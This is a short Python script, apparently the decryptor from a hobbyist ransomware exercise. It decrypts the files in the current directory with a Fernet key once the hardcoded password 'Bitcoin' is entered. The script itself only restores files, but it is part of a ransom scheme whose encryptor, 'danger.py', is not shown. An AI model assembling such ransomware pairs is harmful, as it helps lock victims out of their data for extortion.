#!/usr/bin/env/ python3

import os #Import the OS module to interact with the system file I created.
from cryptography.fernet import Fernet # Fernet import for encryption services.

# This creates an empty list to store filenames.
files = []

# Loops through all files in the current directory.
for file in os.listdir():
	if file == "danger.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)

# This will open the encryption key file and read the stored key.
with open("thekey.key", "rb") as key:
	secretkey = key.read()

# This defines the password to decrypt the files.
secretpassword = "Bitcoin"

user_password = input("enter the password to decrypt your files\n")

if user_password == secretpassword:
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)

	print("your files are decrypted")
else:
	print("Sorry, wrong password")
